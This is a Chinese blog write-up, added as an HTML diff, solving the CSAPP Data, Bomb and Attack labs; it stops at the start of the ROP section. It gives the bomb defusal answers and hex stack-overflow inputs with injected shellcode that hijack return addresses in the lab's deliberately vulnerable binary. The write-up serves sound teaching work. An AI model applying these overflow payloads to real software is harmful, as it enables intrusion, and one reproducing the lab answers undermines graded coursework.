@@ -1,0 +1,1383 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CSAPP, 计算机基础, 实验,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    CSAPP Lab WriteUp |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-csapp-lab-writeup"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CSAPP Lab WriteUp
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/07/csapp-lab-writeup/" class="article-date">
+  <time datetime="2020-07-22T06:53:29.000Z" itemprop="datePublished">2020-07-22</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/">天问之路</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">10.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">41 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="简介">简介</h2>
+<ul>
+<li>这里会存放一些CSAPP Lab的WriteUp，以及一点心得</li>
+<li>相关代码存放于 <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week9-19/CSAPP-Lab" target="_blank" rel="noopener">github</a></li>
+</ul>
+<a id="more"></a>
+<ul>
+<li>内容较多，请使用右边的导航栏定向跳转。</li>
+</ul>
+<h2 id="1-Data-Lab">1. Data Lab</h2>
+<ul>
+<li>lab目录下，终端键入<code>make all</code>即可编译代码</li>
+<li>我们所要做的就是实现文件<code>bits.c</code>中的每个函数的功能。实现功能时不同函数会有不同的限制，例如不能使用运算符<code>!</code>等等。</li>
+<li>键入<code>./btest</code>以测试文件<code>bits.c</code>中的函数</li>
+<li>键入<code>./dlc bits.c</code>以检查文件<code>bits.c</code>中的函数是否使用了被限制的运算符。如果一切正常，则不输出任何信息。</li>
+<li>键入<code>./ishow &lt;intNum&gt;</code>或<code>./fshow &lt;floatNum&gt;</code>以查看传入十六进制的详细信息</li>
+<li>笔者实现的源码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/1.%20Data%20Lab/bits.c" target="_blank" rel="noopener">github</a>
+<blockquote>
+<p>Write Up全部以注释的形式写入代码中，方便阅读与理解</p>
+</blockquote>
+</li>
+</ul>
+<h2 id="2-Bomb-Lab">2. Bomb Lab</h2>
+<ul>
+<li>Bomb Lab是一个类似于拆炸弹的实验，需要我们通过反汇编进行逆向分析，找出各个通关phases</li>
+<li>阅读<code>bomb.c</code>代码，注意到程序可以打开某个文件，并将其作为输入的来源。<br>
+所以我们可以建立一个文件并将找到的phases存至其中，以避免重复的输入</li>
+<li>如果对gdb不太熟练，可以查阅<a href="/2020/04/gdb_command/">gdb常用命令</a></li>
+<li>键入<code>gdb bomb</code>，在main函数初始位置下断点，并键入<code>run input.txt</code>以启动调试。
+<blockquote>
+<p><code>input.txt</code>是传给bomb的参数（输入文件的名称）</p>
+</blockquote>
+</li>
+<li>输入phases时，随意输入一个容易辨别的字符串，例如<code>1122333</code>
+<blockquote>
+<p>需要注意的是，<code>read_line</code>函数会将每一行的最后一个字符（通常是<code>\n</code>）替换为<code>\0</code>， 如果程序的最后一个字符并非<code>\n</code>等无效字符，则phases的最后一个字符会被清除。避免该问题最有效的办法就是将输入文件中的每一行phases末尾增加一个换行符。</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="1-phases-1">1) phases_1</h3>
+<p>单步进入<code>phase_1</code>函数。程序会通过<code>string_no_equal</code>函数判断输入的字符串是否与特定字符串相等，如果不相等则炸弹爆炸。<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_1.png" alt="img"><br>
+由此可得出<code>phases1</code>为<code>Border relations with Canada have never been better.</code>(勿漏句末<em>点号</em>)</p>
+<h3 id="2-phases-2">2) phases_2</h3>
+<p><code>phases_2</code>函数中，首先会调用<code>read_six_numbers</code>函数，从刚刚的一行输入中读取6个数字, 并判断<code>a == 1 ?</code>，<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_1.png" alt="img"></p>
+<blockquote>
+<p>为了简化说明，我们将输入的6个数分别取名为<strong>a, b, c, d, e, f</strong>。<br>
+将<strong>a是否等于b</strong>命名为<code>a = b ?</code></p>
+</blockquote>
+<p>之后循环判断  <strong>2 * 当前遍历到的数 == 下一个遍历到的数 ?</strong><br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_2.png" alt="img"><br>
+即判断输入的6个数是否是<strong>以2为公比的非零等比数列</strong>，如果所有条件都满足则通过此关卡。由此可得出<code>phases2</code>可以是<code>1 2 4 8 16 32</code></p>
+<h3 id="3-phases-3">3) phases_3</h3>
+<p><code>phases_3</code>函数中，程序会先将读入的一行字符串转化为两个数字（如果转换的数字个数不为2则爆炸）然后判断第一个数<code>a &lt; 7 ?</code>。第二个数的值取决于第一个数。如果第二个数与第一个数所指定的常数相等，则通过此关卡。<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_3.png" alt="img"><br>
+由此我们可以得到<code>phases3</code>： <code>7 327</code>（答案不唯一）</p>
+<h3 id="4-phases-4">4) phases_4</h3>
+<p><code>phases_4</code>函数与<code>phases_3</code>函数类似，都会读入两个数字。该函数会执行以下流程</p>
+<ul>
+<li>判断输入的第一个数字<code>a</code>是否小于等于14（注意数字<code>a</code>是无符号整数）</li>
+<li>执行函数<code>func4(a, 0, 14)</code>，并判断其返回值是否等于0</li>
+<li>判断输入的第二个数<code>b</code>是否等于0</li>
+</ul>
+<p><img src="/2020/07/csapp-lab-writeup/bomblab_phases_4.png" alt="img"><br>
+<code>func4</code>函数比较特殊，该函数会在内部递归调用自身。通过分析其反汇编代码，得到以下C代码</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> arg0, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp1 = arg2 - arg1;</span><br><span class="line">    <span class="comment">// 逻辑右移获取符号位</span></span><br><span class="line">    <span class="keyword">int</span> tmp2 = (tmp1 &gt;&gt; <span class="number">31</span>) + tmp1;</span><br><span class="line">    tmp2 &gt;&gt;= <span class="number">1</span>; <span class="comment">// 算术右移</span></span><br><span class="line">    <span class="keyword">int</span> tmp3 = tmp2 + arg1;</span><br><span class="line">    <span class="keyword">if</span> (tmp3 &lt;= arg0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp3 &gt;= arg0) <span class="comment">// 实际上这里就是tmp3 == arg0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, tmp3 + <span class="number">1</span>, arg2) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, arg1, tmp3 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>通过暴力枚举，可以得到<code>func(x, 0, 14) == 0</code>的4个解，分别为0, 1, 3, 7。<br>
+故，<code>phases4</code>可以是<code>0 0</code>(答案不唯一)</p>
+<h3 id="5-phases-5">5) phases_5</h3>
+<p><code>phases_5</code>函数中，程序会</p>
+<ol>
+<li>判断读入的字符串长度是否等于6</li>
+<li>循环6次，以<code>ch &amp; 0xf</code>为索引，每次在全局字符串<strong>maduiersnfotvbyl</strong>中获取一个字符<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_5.png" alt="img"></li>
+<li>待6次循环结束后，将选出的字符串与字符串<code>flyers</code>相比较，如果相同，则通过当前关卡</li>
+</ol>
+<p>故根据上面的信息可得，<code>phases_5</code>: <code>ionefg</code> / <code>IONEFG</code> （答案不为一）</p>
+<h3 id="6-phases-6">6) phases_6</h3>
+<p>函数<code>phases_6</code>提高了难度。为了便于说明，我们为输入的6个数字命名为 <strong>a1, a2, a3, a4, a5, a6</strong>。</p>
+<ul>
+<li>
+<p>第一部分是一个嵌套循环。<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_1.png" alt="img"><br>
+为便于理解，将该嵌套循环的汇编代码翻译为如下C代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6个输入的数字</span></span><br><span class="line"><span class="keyword">int</span> inputNum[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span>* r13d = inputNum;</span><br><span class="line"><span class="keyword">int</span> r12d = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span>* rbp = r13d;</span><br><span class="line">  <span class="comment">// 所输入的数必须大于1，小于6</span></span><br><span class="line">  <span class="keyword">if</span>(*rbp - <span class="number">1</span> &lt;= <span class="number">5</span>) <span class="comment">// 无符号比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果遍历完成，则跳出循环</span></span><br><span class="line">    <span class="keyword">if</span>(++r12d == <span class="number">6</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">int</span> ebx = r12d;</span><br><span class="line">    <span class="comment">// 循环检测字符是否相等</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(inputNum[ebx] == rbp)</span><br><span class="line">        explode_bomb();</span><br><span class="line">      ebx++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(ebx &lt;= <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 指向下一个数组位置</span></span><br><span class="line">    r13d++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个代码比较简单，因为它实际上就是遍历检测所输入的6个数是否出现重复，如果存在重复则爆炸。同时还将输入的数字限制在了1-6中(注意其中的数字是 <strong>无符号</strong> 整数)</p>
+</li>
+<li>
+<p>第二部分是一个简单的循环。这个循环将输入的六个数字设置为 <code>inputNum[i] = 7 - inputNum[i]</code><br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_2.png" alt="img"></p>
+</li>
+<li>
+<p>第三部分同样是一个循环，为便于说明，将该部分的汇编代码转换为如下的C代码：</p>
+<blockquote>
+<p>为了便于直观，调换了部分代码的顺序，不影响最终结果</p>
+</blockquote>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> rsi = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ecx = inputNum[rsi];</span><br><span class="line">  <span class="keyword">if</span>(inputNum[rsi] &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="comment">// node是链表上的一个结点。该节点由 int与int* 组成</span></span><br><span class="line">    <span class="built_in">list</span>[rsi] = &amp;node1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> eax = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rdx = &amp;node1;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      rdx = rdx-&gt;next;</span><br><span class="line">      eax++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(eax == ecx);</span><br><span class="line">    <span class="comment">// 此时rdx == &amp;node6</span></span><br><span class="line">    <span class="built_in">list</span>[rsi] = rdx;</span><br><span class="line">  &#125;</span><br><span class="line">  rsi++;</span><br><span class="line">  <span class="keyword">if</span>(rsi == <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>程序遍历之前转换的值，并将其作为索引，来获取链表上特定位置的地址，并将其存入栈中。</p>
+</li>
+<li>
+<p>第四部分还是一个万年不变的循环。<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_3.png" alt="img"><br>
+这个循环会改变原来的链表顺序，并将其设置为栈上链表的顺序。其代码如下</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rcx = <span class="built_in">list</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span>* rax = &amp;<span class="built_in">list</span>[<span class="number">1</span>]; rax != &amp;<span class="built_in">list</span>[<span class="number">5</span>]; rax++)</span><br><span class="line">&#123;</span><br><span class="line">  rcx-&gt;address = *rax;</span><br><span class="line">  rcx = *rax;</span><br><span class="line">&#125;</span><br><span class="line">rcx-&gt;address = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>第五部分是一个校验循环。这个循环会使用新顺序来获取链表上的值并判断其关系，其中链表上的值必须逐级递减，否则炸弹爆炸。<br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_4.png" alt="img"><br>
+由于链表上的值顺序为 <strong>node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2</strong><br>
+<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_5.png" alt="img"><br>
+故我们最后终于可以得出<code>phases6</code>: <code>4 3 2 1 6 5</code></p>
+</li>
+</ul>
+<h3 id="7-secret-phase">7) secret_phase</h3>
+<ul>
+<li>
+<p>当6个关卡都通过之后，我们跟进<code>phase_defused</code>，发现还有隐藏关卡。<br>
+在进入隐藏关卡前，我们需要先通过两个判断。<br>
+<img src="/2020/07/csapp-lab-writeup/phases_defuse_1.png" alt="img"><br>
+将第一个判断的<code>sscanf</code>操作的字符串所在内存输出，可以看出，该字符串是<code>phases_4</code>关卡的输入<br>
+函数参数：<br>
+<img src="/2020/07/csapp-lab-writeup/phases_defuse_2.png" alt="img"><br>
+内部内存的值：<br>
+<img src="/2020/07/csapp-lab-writeup/phases_defuse_3.png" alt="img"><br>
+同时，第二个判断所对比的字符串为<br>
+<img src="/2020/07/csapp-lab-writeup/phases_defuse_4.png" alt="img"><br>
+故我们可以在<code>phases_4</code>关卡的输入后追加字符串<code>DrEvil</code>来进入隐藏关卡<code>secret_phase</code>。</p>
+</li>
+<li>
+<p><code>secret_phase</code>关卡中会先读入一个数字<code>inputNum</code>，并满足该条件<code>(inputNum - 1）&lt;= 0x3e8(1000)</code>, 即输入的数字必须小于等于1001。<br>
+之后执行函数<code>fun7(&amp;n1, inputNum)</code>。当该函数的返回值为2时则通过此关卡。<br>
+全局变量<code>n1</code>是一个树节点，其所有相关的树节点如下所示<br>
+<img src="/2020/07/csapp-lab-writeup/secret_phase_1.png" alt="img"><br>
+为便于理解，将函数<code>fun7</code>的汇编代码转为C代码：</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(treeNode* node, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(node == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(node-&gt;val &lt;= num)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(node-&gt;Val == num)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;right, num) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">2</span> * fun7(node-&gt;left, num);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>易知，若需<code>fun7(&amp;n1, inputNum) == 2</code>, 则要进行如下操作</p>
+<ul>
+<li>调用<strong>fun7(&amp;n1, inputNum)</strong>。此时 <strong>n1.val == 0x24</strong></li>
+<li>递归向下调用<strong>fun7(arg.left, inputNum)</strong>, 此时 <strong>arg.val == 0x8</strong></li>
+<li>再次递归向下调用<strong>fun7(newArg.right, inputNum)</strong>, 此时 <strong>newArg.val == 0x16 == 22</strong></li>
+<li>在这最后调用的 <strong>fun7(newArg.right, inputNum)</strong> 中返回0<br>
+综上所述，本次输入的数字应为<code>22</code></li>
+</ul>
+</li>
+<li>
+<p>最后的输入文本为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">7 327</span><br><span class="line">0 0 DrEvil</span><br><span class="line">ionefg</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">22</span><br></pre></td></tr></table></figure>
+<p>通关截图<br>
+<img src="/2020/07/csapp-lab-writeup/success.png" alt="img"></p>
+</li>
+</ul>
+<h2 id="3-Attack-Lab">3. Attack Lab</h2>
+<ul>
+<li>Attack Lab要求进行五次的攻击实验，其中所使用的攻击方式是<strong>代码注入</strong>和<strong>ROP</strong></li>
+</ul>
+<h3 id="1-Code-Injection">1) Code Injection</h3>
+<ul>
+<li>
+<p><code>ctarget</code>文件：该文件用于代码注入实验。</p>
+</li>
+<li>
+<p>在代码注入实验中，通过使缓冲区溢出、注入攻击代码来完成特殊目的。</p>
+</li>
+<li>
+<p>在<code>stable_stable_launch</code>函数中有个很有意思的操作。程序会mmap出一块RWX的内存，并将栈指针迁移到这块固定地址的内存上。这一步方便了后续的代码执行操作，否则原始栈上数据是不可执行的(NX)<br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_1.png" alt="img"></p>
+</li>
+<li>
+<p>代码注入脆弱点位于<code>getbuf</code>函数中，该函数会调用<code>gets</code>函数，这可能会造成溢出。<br>
+在该函数中，字符串所存入的地址为<code>0x5561dc78</code>，当前函数的返回地址存储于<code>0x5561dca0</code>，其相对偏移为<code>40</code><br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_2.png" alt="img"></p>
+</li>
+<li>
+<p><strong>phase1</strong></p>
+<ul>
+<li>
+<p>该关卡只要求将程序的控制流返回至<code>touch1</code>函数中即可，其中该函数的地址为<code>0x4017c0</code></p>
+</li>
+<li>
+<p>这里需要利用栈溢出来修改栈上的<strong>函数返回地址</strong></p>
+</li>
+<li>
+<p>故最终的输入文件如下</p>
+<blockquote>
+<p>注意文件中的<code>00</code>不可省略，因为这是函数地址的一部分（64位中指针大小为8字节）<br>
+注意<strong>小端序</strong></p>
+</blockquote>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>通过当前关卡的截图如下</p>
+<p><img src="/2020/07/csapp-lab-writeup/ctarget_touch1.png" alt="img"></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>phase2</strong></p>
+<ul>
+<li>
+<p><code>touch2</code>函数与<code>touch1</code>不太一样，它多了一项寄存器的比较。只有当<code>%edx == &lt;cookie&gt;</code>时才能通过当前关卡。<br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_3.png" alt="img"></p>
+</li>
+<li>
+<p>此时我们就需要在栈上布下代码，使控制流在<code>getBuf</code>函数返回时<strong>跳转至栈上的代码</strong>，<strong>修改%edx寄存器</strong>并最终<strong>跳转回<code>touch2</code>函数</strong>。这部分代码为</p>
+<blockquote>
+<p><code>touch2</code>函数的地址为<code>0x4017ec</code></p>
+</blockquote>
+  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x59b997fa, %rdi # <span class="number">0x59b997fa</span>是个人cookie</span><br><span class="line"><span class="keyword">push</span> <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>之后执行以下指令，将其编译为机器码并显示详细信息。</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c asm.s -o asm.o &amp;&amp; objdump -d asm.o</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/csapp-lab-writeup/ctarget_asm_1.png" alt="img"></p>
+</li>
+<li>
+<p>最后我们的输入数据如下</p>
+  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p>通过当前关卡的截图如下<br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_touch2.png" alt="img"></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>phase3</strong></p>
+<ul>
+<li>
+<p><code>touch3</code>函数与<code>touch2</code>函数类似，都存在着一个比较的判断，通过该判断即可通过当前关卡。<br>
+所不同的是，<code>touch3</code>函数中使用另一个函数<code>hexmatch</code>进行判断。<code>hexmatch</code>传入的参数分别为<code>&amp;cookie</code>与<code>touch3</code>的第一个参数<code>%rdi</code>。<br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_3_2.png" alt="img"></p>
+</li>
+<li>
+<p>分析<code>hexmatch</code>函数，可以发现，当栈溢出时刻的<code>%rdi == 0x5561dc13</code>时，即可通过当前关卡。<br>
+<img src="/2020/07/csapp-lab-writeup/ctarget_3_1.png" alt="img"></p>
+</li>
+<li>
+<p>由于该关卡修改的寄存器与第二关的寄存器一致，所以可以直接修改第二关的输入数据，即可得到当前关卡的输入数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 13 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">31 31 31 31 31 31 31 31</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/07/csapp-lab-writeup/ctarget_3_3.png" alt="img"></p>
+</li>
+<li>
+<p><strong>注意!</strong> 这个解实际上是 <strong>非预期解</strong> 。按照正常的逻辑，用于存放cookie字符串的内存地址应该是随机的。</p>
+  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但由于程序内部并没有初始化随机数种子，所以生成的随机数始终是固定的，进而导致用于存放cookie字符串的内存地址一直是同一个地址。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-ROP">2) ROP</h3>
+<ul>
+<li><code>rtarget</code>文件： 该文件用于ROP实验</li>
+<li>该文件使用了<strong>栈随机化(ASLR)</strong> 与 <strong>栈不可执行(NX)</strong> 这两项技术来防止代码注入攻击，所以我们要使用 <strong>ROP</strong> 攻击来完成特定目的。</li>
+<li><code>gets</code>输入点与函数返回地址存放位置之间的相对偏移仍是<code>40</code>。</li>
+<li>下面是一张汇编与机器表示相关的表格<br>
+<img src="/2020/07/csapp-lab-writeup/attack_lab_ref.png" alt="img"></li>
+<li><strong>phase4</strong>
+<ul>
+<li>
+<p>使用<code>objdump -S rtarget &gt; rtarget.s</code>指令将<code>rtarget</code>文件中的反汇编输出</p>
+<blockquote>
+<p>这里只截取了ROP可能会用到的部分汇编</p>
+</blockquote>
